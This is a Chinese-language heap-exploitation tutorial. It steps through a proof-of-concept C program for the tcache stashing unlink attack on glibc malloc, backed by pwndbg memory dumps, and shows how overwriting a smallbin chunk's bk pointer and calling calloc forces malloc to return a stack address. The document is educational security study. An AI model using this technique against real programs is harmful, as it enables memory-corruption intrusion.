# 前言
这一小节我们来看tcache_stashing_unlink_attack这种攻击方式，这种攻击方式的原理仍然是对smallbin中free chunk的bk指针进行修改（和上一节的house of lore原理相同），但是此种方式需要calloc函数

# 影响版本
具有或开启tcache机制的glibc malloc

# POC
## POC源码
```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main(){
    unsigned long stack_var[0x10] = {0};
    unsigned long *chunk_lis[0x10] = {0};
    unsigned long *target;

    setbuf(stdout, NULL);

    printf("This file demonstrates the stashing unlink attack on tcache.\n\n");
    printf("This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n");
    printf("This technique can be used when you are able to overwrite the victim->bk pointer. Besides, it's necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n");
    printf("The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n");
    printf("This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we'll create the chunk on the stack.\n\n");

    // stack_var emulate the fake_chunk we want to alloc to
    printf("Stack_var emulates the fake chunk we want to alloc to.\n\n");
    printf("First let's write a writeable address to fake_chunk->bk to bypass bck->fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk->bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n");

    stack_var[3] = (unsigned long)(&stack_var[2]);

    printf("You can see the value of fake_chunk->bk is:%p\n\n",(void*)stack_var[3]);
    printf("Also, let's see the initial value of stack_var[4]:%p\n\n",(void*)stack_var[4]);
    printf("Now we alloc 9 chunks with malloc.\n\n");

    //now we malloc 9 chunks
    for(int i = 0;i < 9;i++){
        chunk_lis[i] = (unsigned long*)malloc(0x90);
    }

    //put 7 chunks into tcache
    printf("Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n");

    for(int i = 3;i < 9;i++){
        free(chunk_lis[i]);
    }

    printf("As you can see, chunk1 & [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n");

    //last tcache bin
    free(chunk_lis[1]);
    //now they are put into unsorted bin
    free(chunk_lis[0]);
    free(chunk_lis[2]);

    //convert into small bin
    printf("Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n");

    malloc(0xa0);// size > 0x90

    //now 5 tcache bins
    printf("Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n");

    malloc(0x90);
    malloc(0x90);

    printf("Now we emulate a vulnerability that can overwrite the victim->bk pointer into fake_chunk addr: %p.\n\n",(void*)stack_var);

    //change victim->bck
    /*VULNERABILITY*/
    chunk_lis[2][1] = (unsigned long)stack_var;
    /*VULNERABILITY*/

    //trigger the attack
    printf("Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n");

    calloc(1,0x90);

    printf("Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck->fd has been changed into a libc addr: %p\n\n",(void*)stack_var[2],(void*)stack_var[4]);

    //malloc and return our fake chunk on stack
    target = malloc(0x90);   

    printf("As you can see, next malloc(0x90) will return the region our fake chunk: %p\n",(void*)target);

    assert(target == &stack_var[2]);
    return 0;
}

```

## POC调试
我们对代码第24行下断点，然后我们开始调试，首先我们来看程序所需要的一些数据，这里在stack_var上伪造了一个地址，这个地址的作用之后再说：

```c
    unsigned long stack_var[0x10] = {0};
    unsigned long *chunk_lis[0x10] = {0};
    unsigned long *target;

    setbuf(stdout, NULL);
    ......
	stack_var[3] = (unsigned long)(&stack_var[2]);
```

```c
pwndbg> x/16gx chunk_lis 
0x7fffffffdd40:	0x0000000000000000	0x0000000000000000
0x7fffffffdd50:	0x0000000000000000	0x0000000000000000
0x7fffffffdd60:	0x0000000000000000	0x0000000000000000
0x7fffffffdd70:	0x0000000000000000	0x0000000000000000
0x7fffffffdd80:	0x0000000000000000	0x0000000000000000
0x7fffffffdd90:	0x0000000000000000	0x0000000000000000
0x7fffffffdda0:	0x0000000000000000	0x0000000000000000
0x7fffffffddb0:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx stack_var 
0x7fffffffdcc0:	0x0000000000000000	0x0000000000000000
0x7fffffffdcd0:	0x0000000000000000	0x00007fffffffdcd0
    								#stack_var[3]
0x7fffffffdce0:	0x0000000000000000	0x0000000000000000
0x7fffffffdcf0:	0x0000000000000000	0x0000000000000000
0x7fffffffdd00:	0x0000000000000000	0x0000000000000000
0x7fffffffdd10:	0x0000000000000000	0x0000000000000000
0x7fffffffdd20:	0x0000000000000000	0x0000000000000000
0x7fffffffdd30:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

然后POC中打印了一些消息（b 29->c）：

```c
You can see the value of fake_chunk->bk is:0x7fffffffdcd0

Also, let's see the initial value of stack_var[4]:(nil)

Now we alloc 9 chunks with malloc.
```

接下来我们在堆上创建了9个大小在tcachebin范围内的堆块，每个堆块返回的指针会保存在chunk_lis数组中（b 34->c）：

```c
    //now we malloc 9 chunks
    for(int i = 0;i < 9;i++){
        chunk_lis[i] = (unsigned long*)malloc(0x90);
    }
```

```c
pwndbg> x/300gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
......
0x555555757250:	0x0000000000000000	0x00000000000000a1 #chunk_lis[0]
......
0x5555557572f0:	0x0000000000000000	0x00000000000000a1 #chunk_lis[1]
......
0x555555757390:	0x0000000000000000	0x00000000000000a1 #chunk_lis[2]
......
0x555555757430:	0x0000000000000000	0x00000000000000a1 #chunk_lis[3]
......
0x5555557574d0:	0x0000000000000000	0x00000000000000a1 #chunk_lis[4]
......
0x555555757570:	0x0000000000000000	0x00000000000000a1 #chunk_lis[5]
......
0x555555757610:	0x0000000000000000	0x00000000000000a1 #chunk_lis[6]
......
0x5555557576b0:	0x0000000000000000	0x00000000000000a1 #chunk_lis[7]
......
0x555555757750:	0x0000000000000000	0x00000000000000a1 #chunk_lis[8]
......
0x5555557577f0:	0x0000000000000000	0x0000000000020811 #top_chunk
......
0x555555757950:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx chunk_lis 
0x7fffffffdd40:	0x0000555555757260	0x0000555555757300
0x7fffffffdd50:	0x00005555557573a0	0x0000555555757440
0x7fffffffdd60:	0x00005555557574e0	0x0000555555757580
0x7fffffffdd70:	0x0000555555757620	0x00005555557576c0
0x7fffffffdd80:	0x0000555555757760	0x0000000000000000
0x7fffffffdd90:	0x0000000000000000	0x0000000000000000
0x7fffffffdda0:	0x0000000000000000	0x0000000000000000
0x7fffffffddb0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

然后我释放刚刚创建的后6个堆块以填充对应大小链表的tcachebin（b 49->c），free掉后3个堆块让其中的两个堆块进入unsortedbin中：

```c
    //put 7 chunks into tcache
    printf("Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n");

    for(int i = 3;i < 9;i++){
        free(chunk_lis[i]);
    }
    printf("As you can see, chunk1 & [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n");

    //last tcache bin
    free(chunk_lis[1]);
    //now they are put into unsorted bin
    free(chunk_lis[0]);
    free(chunk_lis[2]);
```

```c
pwndbg> x/300gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
......
0x555555757250:	0x0000000000000000	0x00000000000000a1 #chunk_lis[0](free-unsortedbin)
......
0x5555557572f0:	0x0000000000000000	0x00000000000000a1 #chunk_lis[1](free-tcachebin)
......
0x555555757390:	0x0000000000000000	0x00000000000000a1 #chunk_lis[2](free-unsortedbin)
......
0x555555757430:	0x0000000000000000	0x00000000000000a1 #chunk_lis[3](free-tcachebin)
......
0x5555557574d0:	0x0000000000000000	0x00000000000000a1 #chunk_lis[4](free-tcachebin)
......
0x555555757570:	0x0000000000000000	0x00000000000000a1 #chunk_lis[5](free-tcachebin)
......
0x555555757610:	0x0000000000000000	0x00000000000000a1 #chunk_lis[6](free-tcachebin)
......
0x5555557576b0:	0x0000000000000000	0x00000000000000a1 #chunk_lis[7](free-tcachebin)
......
0x555555757750:	0x0000000000000000	0x00000000000000a1 #chunk_lis[8](free-tcachebin)
......
0x5555557577f0:	0x0000000000000000	0x0000000000020811 #top_chunk
......
0x555555757950:	0x0000000000000000	0x0000000000000000
pwndbg>
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1621219960867-83dd9d04-80b3-44cf-bfb2-676ab41b7948.png)

> 注意：这里的free顺序可不是乱来的：
>
> Q：为什么要先释放后6个堆块让其进入tcachebin？
>
> A：这样考虑的原因是在之后释放3个堆块时可以让其进入unsortedbin中，如果先释放前6个堆块那么后续的3个堆块的最后一个堆块会与top_chunk合并导致攻击失败。
>
> Q：为什么要这样释放free【chunk1】、free【chunk0】、free【chunk2】
>
> A：首先让chunk1进入tcachebin，这样的作用是防止后续进入unsortedbin的chunk0、chunk2发生合并导致攻击失败。
>

现在我们再申请一个大小为0xa0的堆块让其进入smallbin中（其实这里malloc堆块的大小不是0x90就行）（b 54->c）：

> 这里不懂的可以去看看malloc源码。
>

```c
    //convert into small bin
    printf("Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n");

    malloc(0xa0);// size > 0x90
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1621220247472-2b947e0c-3c42-4a84-a0a0-0dd78aa4c296.png)

如上图所示原来的unsortedbin中的free chunk已经进入了smallbin中，现在我们清空两个tcachebin中的free chunk，为之后的攻击做准备（b 59->c）：

```c
    //now 5 tcache bins
    printf("Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n");

    malloc(0x90);
    malloc(0x90);
```

```c
pwndbg> x/300gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
0x555555757010:	0x0000000000000000	0x0000000000000005
......
0x555555757090:	0x00005555557576c0	0x0000000000000000
......
0x555555757250:	0x0000000000000000	0x00000000000000a1 #chunk_lis[0](free-smallbin)
0x555555757260:	0x00007ffff7dcdd30	0x0000555555757390
......
0x5555557572f0:	0x00000000000000a0	0x00000000000000a0 #chunk_lis[1](malloc)
0x555555757300:	0x0000555555757760	0x0000000000000000
......
0x555555757390:	0x0000000000000000	0x00000000000000a1 #chunk_lis[2](free-smallbin)
0x5555557573a0:	0x0000555555757250	0x00007ffff7dcdd30
......
0x555555757430:	0x00000000000000a0	0x00000000000000a0 #chunk_lis[3](free-tcachebin)
0x555555757440:	0x0000000000000000	0x0000555555757010
......
0x5555557574d0:	0x0000000000000000	0x00000000000000a1 #chunk_lis[4](free-tcachebin)
0x5555557574e0:	0x0000555555757440	0x0000555555757010
......
0x555555757570:	0x0000000000000000	0x00000000000000a1 #chunk_lis[5](free-tcachebin)
0x555555757580:	0x00005555557574e0	0x0000555555757010
......
0x555555757610:	0x0000000000000000	0x00000000000000a1 #chunk_lis[6](free-tcachebin)
0x555555757620:	0x0000555555757580	0x0000555555757010
......
0x5555557576b0:	0x0000000000000000	0x00000000000000a1 #chunk_lis[7](free-tcachebin)
0x5555557576c0:	0x0000555555757620	0x0000555555757010
......
0x555555757750:	0x0000000000000000	0x00000000000000a1 #chunk_lis[8](free-tcachebin)
0x555555757760:	0x00005555557576c0	0x0000000000000000
......
0x5555557577f0:	0x0000000000000000	0x00000000000000b1 #chunk(malloc)
......
0x5555557578a0:	0x0000000000000000	0x0000000000020761 #top_chunk
......
0x555555757950:	0x0000000000000000	0x0000000000000000
pwndbg>
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1621220384137-9d9b4a7d-3e6d-45d5-aea0-c238de71e03e.png)

```c
smallbins
0xa0: 0x555555757390 —▸ 0x555555757250 —▸ x (main_arena+240) ◂— 0x555555757390
	  #后释放【chunk2】   #先释放【chunk0】
```

现在我们开始攻击，假如说现在有UAF或者堆溢出漏洞可以修改chunk_lis[2]的bk指针，这里我们将其修改为之前伪造的stack地址（b 67->c）：

```c
    printf("Now we emulate a vulnerability that can overwrite the victim->bk pointer into fake_chunk addr: %p.\n\n",(void*)stack_var);

    //change victim->bck
    /*VULNERABILITY*/
    chunk_lis[2][1] = (unsigned long)stack_var;
    /*VULNERABILITY*/
```

```c
pwndbg> x/300gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
0x555555757010:	0x0000000000000000	0x0000000000000005
......
0x555555757090:	0x00005555557576c0	0x0000000000000000
......
0x555555757250:	0x0000000000000000	0x00000000000000a1 #chunk_lis[0](free-smallbin)
0x555555757260:	0x00007ffff7dcdd30	0x0000555555757390
......
0x5555557572f0:	0x00000000000000a0	0x00000000000000a0 #chunk_lis[1](malloc)
0x555555757300:	0x0000555555757760	0x0000000000000000
......
0x555555757390:	0x0000000000000000	0x00000000000000a1 #chunk_lis[2](free-smallbin)
0x5555557573a0:	0x0000555555757250	0x00007fffffffdcc0
    							   #0x00007ffff7dcdd30
......
0x555555757430:	0x00000000000000a0	0x00000000000000a0 #chunk_lis[3](free-tcachebin)
0x555555757440:	0x0000000000000000	0x0000555555757010
......
0x5555557574d0:	0x0000000000000000	0x00000000000000a1 #chunk_lis[4](free-tcachebin)
0x5555557574e0:	0x0000555555757440	0x0000555555757010
......
0x555555757570:	0x0000000000000000	0x00000000000000a1 #chunk_lis[5](free-tcachebin)
0x555555757580:	0x00005555557574e0	0x0000555555757010
......
0x555555757610:	0x0000000000000000	0x00000000000000a1 #chunk_lis[6](free-tcachebin)
0x555555757620:	0x0000555555757580	0x0000555555757010
......
0x5555557576b0:	0x0000000000000000	0x00000000000000a1 #chunk_lis[7](free-tcachebin)
0x5555557576c0:	0x0000555555757620	0x0000555555757010
......
0x555555757750:	0x0000000000000000	0x00000000000000a1 #chunk_lis[8](free-tcachebin)
0x555555757760:	0x00005555557576c0	0x0000000000000000
......
0x5555557577f0:	0x0000000000000000	0x00000000000000b1 #chunk(malloc)
......
0x5555557578a0:	0x0000000000000000	0x0000000000020761 #top_chunk
......
0x555555757950:	0x0000000000000000	0x0000000000000000
pwndbg>
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1621220778327-e45ed6c2-0b14-4a58-91e0-ab49a5ade87b.png)

如上图所示，虽然在pwndbg中smallbin的0xa0链表发生了corrupted（异常），但是glibc malloc并不会检测到此异常，我们调用calloc直接向smallbin中申请堆块，这里引入源码进行调试：

```c
    //trigger the attack
    printf("Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n");

    calloc(1,0x90);
```

我们调试到此处：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1621299758456-9e1d331f-55c5-4ed4-b6cd-fb9bf0c1fb28.png)

接下来的步骤可以看如下PPT：

[tcache_stashing_unlink_attack.pptx](https://www.yuque.com/attachments/yuque/0/2021/pptx/574026/1621307617181-6cd0ba1d-7e5b-452d-9d06-8a9a1a0c8a2a.pptx)

> **<font style="color:#F5222D;">这里一定要注意：smallbin的分配机制是先入先出（FIFO）</font>**
>

第一次放入：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1621306249880-0331e36d-46db-477a-ab76-3ce1f10cfd90.png)

完成后内容如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1621220946055-8d1f51aa-43d4-48b2-ba42-414240c951d8.png)

> 注意，这里stack上的bk位可不是乱伪造的，详见PPT
>

完成后内存状况如下：

```c
pwndbg> x/300gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
0x555555757010:	0x0000000000000000	0x0000000000000007
......
0x555555757090:	0x00007fffffffdcd0	0x0000000000000000
......
0x555555757250:	0x0000000000000000	0x00000000000000a1 #chunk_lis[0](malloc)
0x555555757260:	0x0000000000000000	0x0000000000000000
......
0x5555557572f0:	0x00000000000000a0	0x00000000000000a0 #chunk_lis[1](malloc)
0x555555757300:	0x0000555555757760	0x0000000000000000
......
0x555555757390:	0x0000000000000000	0x00000000000000a1 #chunk_lis[2](free-smallbin)
0x5555557573a0:	0x00005555557576c0	0x0000555555757010 #chunk_lis[2](free-tcachebin)
    							   #0x00007ffff7dcdd30
......
0x555555757430:	0x00000000000000a0	0x00000000000000a0 #chunk_lis[3](free-tcachebin)
0x555555757440:	0x0000000000000000	0x0000555555757010
......
0x5555557574d0:	0x0000000000000000	0x00000000000000a1 #chunk_lis[4](free-tcachebin)
0x5555557574e0:	0x0000555555757440	0x0000555555757010
......
0x555555757570:	0x0000000000000000	0x00000000000000a1 #chunk_lis[5](free-tcachebin)
0x555555757580:	0x00005555557574e0	0x0000555555757010
......
0x555555757610:	0x0000000000000000	0x00000000000000a1 #chunk_lis[6](free-tcachebin)
0x555555757620:	0x0000555555757580	0x0000555555757010
......
0x5555557576b0:	0x0000000000000000	0x00000000000000a1 #chunk_lis[7](free-tcachebin)
0x5555557576c0:	0x0000555555757620	0x0000555555757010
......
0x555555757750:	0x0000000000000000	0x00000000000000a1 #chunk_lis[8](free-tcachebin)
0x555555757760:	0x00005555557576c0	0x0000000000000000
......
0x5555557577f0:	0x0000000000000000	0x00000000000000b1 #chunk(malloc)
......
0x5555557578a0:	0x0000000000000000	0x0000000000020761 #top_chunk
......
0x555555757950:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx stack_var 
0x7fffffffdcc0:	0x0000000000000000	0x0000000000000000
0x7fffffffdcd0:	0x00005555557573a0	0x0000555555757010
0x7fffffffdce0:	0x00007ffff7dcdd30	0x0000000000000000
0x7fffffffdcf0:	0x0000000000000000	0x0000000000000000
0x7fffffffdd00:	0x0000000000000000	0x0000000000000000
0x7fffffffdd10:	0x0000000000000000	0x0000000000000000
0x7fffffffdd20:	0x0000000000000000	0x0000000000000000
0x7fffffffdd30:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

注意现在的stack_var和堆块0x555555757390、0x5555557576c0都有两个bin：smallbin和tcachebin。

现在再次申请一次即可控制stack上的地址（b 79->c）：

```c
    printf("Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck->fd has been changed into a libc addr: %p\n\n",(void*)stack_var[2],(void*)stack_var[4]);

    //malloc and return our fake chunk on stack
    target = malloc(0x90);   

    printf("As you can see, next malloc(0x90) will return the region our fake chunk: %p\n",(void*)target);

    assert(target == &stack_var[2]);
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1621220991490-5473d6b8-8aba-410e-97d3-13e444bb7569.png)

另外，申请之后不可再次calloc申请，因为在整理smallbin堆块到tcachebin时会发生内存访问错误：0x0

# 总结
tcache_stashing_unlink_attack和house of lore都是对smallbin的缺陷发生攻击，即在对smallbin中的free chunk进行解链时只对前两个堆块之间的双向链表完整性进行检查而不对之后的堆块进行检查，通过这一点可以控制任意地址。另外tcache_stashing_unlink_attack和house of lore略有不同，可以将本篇文章和上一篇进行对比，tcache_stashing_unlink_attack要求的条件比较少，但是需要calloc跳过tcachebin申请。

